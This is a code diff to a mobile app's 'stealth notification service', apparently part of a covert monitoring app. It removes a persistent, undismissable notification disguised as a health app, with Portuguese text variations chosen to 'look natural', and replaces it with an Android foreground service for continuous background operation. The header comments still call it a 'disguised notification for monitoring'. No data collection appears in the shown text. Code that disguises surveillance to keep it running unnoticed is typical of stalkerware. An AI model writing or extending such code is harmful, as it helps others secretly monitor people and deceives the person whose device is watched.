@@ -1,71 +1,41 @@
-import { LocalNotifications, ScheduleOptions } from '@capacitor/local-notifications';
+/**
+ * Stealth Notification Service
+ * Manages the persistent disguised notification for monitoring
+ * Now uses ForegroundService for true background operation on Android
+ */
+
 import { Capacitor } from '@capacitor/core';
-
-// Configuração da notificação disfarçada como app de saúde/fitness
-const STEALTH_NOTIFICATION_ID = 9999;
-
-const STEALTH_CONFIG = {
-  title: 'Bem-estar Ativo',
-  body: 'Monitorando sua saúde',
-  smallIcon: 'ic_stat_hearing', // Ícone pequeno para Android
-  largeIcon: 'ic_launcher', // Ícone grande
-  ongoing: true, // Não pode ser dispensada pelo usuário
-  autoCancel: false,
-  silent: true,
-};
-
-// Variações de texto para parecer mais natural
-const TEXT_VARIATIONS = [
-  { title: 'Bem-estar Ativo', body: 'Monitorando sua saúde' },
-  { title: 'Bem-estar Ativo', body: 'Acompanhando seu dia' },
-  { title: 'Saúde em Foco', body: 'Monitoramento ativo' },
-  { title: 'Bem-estar Ativo', body: 'Cuidando de você' },
-];
+import { backgroundService } from './backgroundService';
 
 class StealthNotificationService {
   private isShowing = false;
-  private hasPermission = false;
 
   /**
-   * Solicita permissão para notificações
+   * Request permission for notifications
+   * For ForegroundService, Android handles this automatically
    */
   async requestPermission(): Promise<boolean> {
     if (!Capacitor.isNativePlatform()) {
       console.log('[StealthNotification] Skipping - not native platform');
       return false;
     }
-
-    try {
-      const result = await LocalNotifications.requestPermissions();
-      this.hasPermission = result.display === 'granted';
-      console.log('[StealthNotification] Permission:', this.hasPermission);
-      return this.hasPermission;
-    } catch (error) {
-      console.error('[StealthNotification] Permission error:', error);
-      return false;
-    }
+    // ForegroundService doesn't require explicit notification permission request
+    // The FOREGROUND_SERVICE permission in AndroidManifest.xml handles this
+    return true;
   }
 
   /**
-   * Verifica se tem permissão
+   * Check if permission is granted
    */
   async checkPermission(): Promise<boolean> {
     if (!Capacitor.isNativePlatform()) {
       return false;
     }
-
-    try {
-      const result = await LocalNotifications.checkPermissions();
-      this.hasPermission = result.display === 'granted';
-      return this.hasPermission;
-    } catch (error) {
-      console.error('[StealthNotification] Check permission error:', error);
-      return false;
-    }
+    return true;
   }
 
   /**
-   * Exibe a notificação de monitoramento disfarçada
+   * Show the monitoring notification (starts foreground service)
    */
   async showMonitoringNotification(): Promise<void> {
     if (!Capacitor.isNativePlatform()) {
@@ -78,48 +48,19 @@ class StealthNotificationService {
       return;
     }
 
-    // Verifica/solicita permissão se necessário
-    if (!this.hasPermission) {
-      const granted = await this.requestPermission();
-      if (!granted) {
-        console.log('[StealthNotification] No permission, skipping');
-        return;
-      }
-    }
-
     try {
-      // Seleciona uma variação de texto aleatória
-      const variation = TEXT_VARIATIONS[Math.floor(Math.random() * TEXT_VARIATIONS.length)];
-
-      const options: ScheduleOptions = {
-        notifications: [
-          {
-            id: STEALTH_NOTIFICATION_ID,
-            title: variation.title,
-            body: variation.body,
-            ongoing: true,
-            autoCancel: false,
-            silent: true,
-            smallIcon: 'ic_stat_hearing',
-            // Android: mantém a notificação fixa
-            extra: {
-              ongoing: true,
-              sticky: true,
-            },
-          },
-        ],
-      };
-
-      await LocalNotifications.schedule(options);
-      this.isShowing = true;
-      console.log('[StealthNotification] Notification shown:', variation.title);
+      const started = await backgroundService.start();
+      if (started) {
+        this.isShowing = true;
+        console.log('[StealthNotification] Foreground service started');
+      }
     } catch (error) {
       console.error('[StealthNotification] Error showing notification:', error);
     }
   }
 
   /**
-   * Remove a notificação de monitoramento
+   * Hide the monitoring notification (stops foreground service)
    */
   async hideMonitoringNotification(): Promise<void> {
     if (!Capacitor.isNativePlatform()) {
@@ -133,18 +74,16 @@ class StealthNotificationService {
     }
 
     try {
-      await LocalNotifications.cancel({
-        notifications: [{ id: STEALTH_NOTIFICATION_ID }],
-      });
+      await backgroundService.stop();
       this.isShowing = false;
-      console.log('[StealthNotification] Notification hidden');
+      console.log('[StealthNotification] Foreground service stopped');
     } catch (error) {
       console.error('[StealthNotification] Error hiding notification:', error);
     }
   }
 
   /**
-   * Atualiza o texto da notificação
+   * Update notification text
    */
   async updateNotificationText(title?: string, body?: string): Promise<void> {
     if (!Capacitor.isNativePlatform() || !this.isShowing) {
@@ -152,25 +91,7 @@ class StealthNotificationService {
     }
 
     try {
-      // Remove e recria com novo texto
-      await this.hideMonitoringNotification();
-      
-      const options: ScheduleOptions = {
-        notifications: [
-          {
-            id: STEALTH_NOTIFICATION_ID,
-            title: title || STEALTH_CONFIG.title,
-            body: body || STEALTH_CONFIG.body,
-            ongoing: true,
-            autoCancel: false,
-            silent: true,
-            smallIcon: 'ic_stat_hearing',
-          },
-        ],
-      };
-
-      await LocalNotifications.schedule(options);
-      this.isShowing = true;
+      await backgroundService.updateText(title, body);
       console.log('[StealthNotification] Notification updated');
     } catch (error) {
       console.error('[StealthNotification] Error updating notification:', error);
@@ -178,12 +99,12 @@ class StealthNotificationService {
   }
 
   /**
-   * Verifica se a notificação está sendo exibida
+   * Check if notification is showing
    */
   isNotificationShowing(): boolean {
     return this.isShowing;
   }
 }
 
-// Exporta uma instância singleton
+// Export singleton instance
 export const stealthNotificationService = new StealthNotificationService();
